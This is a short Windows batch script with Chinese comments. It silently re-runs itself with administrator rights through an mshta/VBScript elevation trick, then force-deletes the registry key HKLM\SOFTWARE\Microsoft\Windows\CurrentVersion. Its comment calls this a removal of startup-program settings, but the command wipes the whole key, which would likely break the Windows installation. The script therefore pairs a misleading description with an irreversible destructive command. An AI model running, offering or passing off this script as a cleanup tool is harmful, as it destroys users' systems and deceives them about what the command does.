@echo off
REM 禁用命令回显

REM 使用 mshta 和 VBScript 提升权限并以管理员身份重新运行当前批处理文件
%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit

REM 删除注册表中的系统启动时自动运行的程序或服务的配置信息
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion /f